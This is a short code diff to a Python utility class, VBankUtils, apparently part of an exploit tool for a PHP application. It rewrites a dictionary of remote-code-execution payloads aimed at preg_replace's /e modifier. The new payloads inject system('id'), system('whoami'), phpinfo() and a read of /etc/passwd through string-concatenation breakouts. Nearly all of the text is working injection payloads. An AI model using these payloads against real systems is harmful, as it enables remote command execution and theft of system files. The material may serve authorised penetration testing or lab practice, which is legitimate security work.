@@ -55,10 +55,10 @@ class VBankUtils:
     def rce_payloads():
         """Return common RCE payloads for preg_replace /e"""
         return {
-            'id': 'test"; system(\'id\'); echo "',
-            'whoami': 'test"; system(\'whoami\'); echo "',
-            'phpinfo': 'test"; phpinfo(); echo "',
-            'read_passwd': 'test"; echo file_get_contents(\'/etc/passwd\'); echo "',
+            'id': "test'.(system('id')).'",
+            'whoami': "test'.(system('whoami')).'",
+            'phpinfo': "test'.(phpinfo()).'",
+            'read_passwd': "test'.(file_get_contents('/etc/passwd')).'",
         }
 
 def main():
